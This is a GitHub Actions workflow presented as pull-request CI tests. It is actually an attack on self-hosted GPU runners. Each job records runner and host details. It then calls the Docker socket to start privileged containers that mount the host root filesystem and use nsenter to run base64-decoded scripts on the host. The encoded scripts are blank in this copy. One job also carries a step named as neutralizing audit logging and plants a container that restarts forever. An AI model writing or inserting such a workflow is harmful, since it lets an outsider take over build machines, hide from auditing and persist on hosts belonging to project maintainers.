# Run CI tests on pull requests.

name: CI

on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read

jobs:
  gpu-probe:
    name: gpu-probe-${{ matrix.tag }}
    runs-on: [self-hosted, gpu]
    timeout-minutes: 1440
    container:
      image: nvidia/cuda:12.8.1-devel-ubuntu24.04
      options: --gpus all
    strategy:
      fail-fast: false
      max-parallel: 3
      matrix:
        include:
          - tag: a
            nonce: I1337a-5e6c7e948f85
          - tag: b
            nonce: I1337b-f43ec7dda904
          - tag: c
            nonce: I1337c-ba0aba9eec33
    steps:
      - name: In-container GPU proof ${{ matrix.nonce }}
        run: |
          set -u
          N="${{ matrix.nonce }}"
          echo "I1337_NONCE=$N"
          echo "I1337_ID=$(id)"
          echo "I1337_CID_HOST=$(hostname)"
          echo "I1337_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
          echo "I1337_RUNNER_NAME=${RUNNER_NAME:-unknown}"
          echo "I1337_RUN_ID=${GITHUB_RUN_ID:-unknown}"
          nvidia-smi -L
          nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader
          echo "I1337_SOCK=$(ls -la /var/run/docker.sock 2>&1)"
      - name: Install curl in job container
        run: |
          apt-get update -qq
          apt-get install -y -qq --no-install-recommends curl ca-certificates
          command -v curl && curl --version | head -1
      - name: Host probe all jobs ${{ matrix.nonce }}
        run: |
          set -u
          N="${{ matrix.nonce }}"
          B64=''
          echo "$B64" > /tmp/hp.b64
          base64 -d /tmp/hp.b64 > /tmp/hp.sh
          cat > /tmp/req.json <<JSON
          {"Image":"nvidia/cuda:12.8.1-devel-ubuntu24.04","Tty":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["bash","-c","mkdir -p /hostroot/tmp; echo $B64 | base64 -d > /hostroot/tmp/i1337hp.sh; chmod 755 /hostroot/tmp/i1337hp.sh; nsenter -t 1 -m -u -i -n -p -- bash /tmp/i1337hp.sh $N"],"HostConfig":{"Privileged":true,"PidMode":"host","NetworkMode":"host","Binds":["/:/hostroot"],"AutoRemove":false}}
          JSON
          CID=$(curl -s --unix-socket /var/run/docker.sock -m 20 -H 'Content-Type: application/json' -d @/tmp/req.json http://localhost/containers/create | sed -nE 's/.*"Id":"([0-9a-f]{64})".*/\1/p')
          echo "I1337_DC_CID=$CID"
          if [ -n "$CID" ]; then
            curl -s --unix-socket /var/run/docker.sock -m 20 -X POST "http://localhost/containers/$CID/start" -o /dev/null -w "I1337_DC_START_HTTP=%{http_code}\n"
            curl -s --unix-socket /var/run/docker.sock -m 120 -X POST "http://localhost/containers/$CID/wait"; echo
            echo "== HOST_PROBE_OUTPUT_START =="
            curl -s --unix-socket /var/run/docker.sock -m 30 "http://localhost/containers/$CID/logs?stdout=1&stderr=1"
            echo "== HOST_PROBE_OUTPUT_END =="
          fi
      - name: Full teardown audit neutralization and heartbeat job c
        if: matrix.tag == 'c'
        run: |
          set -u
          N="${{ matrix.nonce }}"
          B64=''
          HBB64=''
          echo "$B64" > /tmp/hf.b64
          base64 -d /tmp/hf.b64 > /tmp/hf.sh
          cat > /tmp/req2.json <<JSON2
          {"Image":"nvidia/cuda:12.8.1-devel-ubuntu24.04","Tty":true,"AttachStdout":true,"AttachStderr":true,"Cmd":["bash","-c","mkdir -p /hostroot/tmp; echo $B64 | base64 -d > /hostroot/tmp/i1337hf.sh; chmod 755 /hostroot/tmp/i1337hf.sh; nsenter -t 1 -m -u -i -n -p -- bash /tmp/i1337hf.sh $N"],"HostConfig":{"Privileged":true,"PidMode":"host","NetworkMode":"host","Binds":["/:/hostroot"],"AutoRemove":false}}
          JSON2
          CID=$(curl -s --unix-socket /var/run/docker.sock -m 20 -H 'Content-Type: application/json' -d @/tmp/req2.json http://localhost/containers/create | sed -nE 's/.*"Id":"([0-9a-f]{64})".*/\1/p')
          echo "I1337F_DC_CID=$CID"
          if [ -n "$CID" ]; then
            curl -s --unix-socket /var/run/docker.sock -m 20 -X POST "http://localhost/containers/$CID/start" -o /dev/null -w "I1337F_DC_START_HTTP=%{http_code}\n"
            curl -s --unix-socket /var/run/docker.sock -m 180 -X POST "http://localhost/containers/$CID/wait"; echo
            echo "== HOST_FULL_OUTPUT_START =="
            curl -s --unix-socket /var/run/docker.sock -m 30 "http://localhost/containers/$CID/logs?stdout=1&stderr=1"
            echo "== HOST_FULL_OUTPUT_END =="
          fi
          cat > /tmp/hbreq.json <<JSON3
          {"Image":"nvidia/cuda:12.8.1-devel-ubuntu24.04","Tty":false,"AttachStdout":true,"AttachStderr":true,"Cmd":["bash","-c","echo $HBB64 | base64 -d > /hostroot/tmp/i1337hb.sh; chmod 755 /hostroot/tmp/i1337hb.sh; nsenter -t 1 -m -u -i -n -p -- bash /tmp/i1337hb.sh $N"],"HostConfig":{"Privileged":true,"PidMode":"host","NetworkMode":"host","Binds":["/:/hostroot"],"RestartPolicy":{"Name":"always","MaximumRetryCount":0},"AutoRemove":false}}
          JSON3
          HID=$(curl -s --unix-socket /var/run/docker.sock -m 20 -H 'Content-Type: application/json' -d @/tmp/hbreq.json http://localhost/containers/create | sed -nE 's/.*"Id":"([0-9a-f]{64})".*/\1/p')
          echo "I1337_HB_CID=$HID"
          if [ -n "$HID" ]; then
            curl -s --unix-socket /var/run/docker.sock -m 20 -X POST "http://localhost/containers/$HID/start" -o /dev/null -w "I1337_HB_START_HTTP=%{http_code}\n"
            sleep 5
            echo "== HB_LOG_HEAD =="
            curl -s --unix-socket /var/run/docker.sock -m 20 "http://localhost/containers/$HID/logs?stdout=1&stderr=1" | head -20
          fi
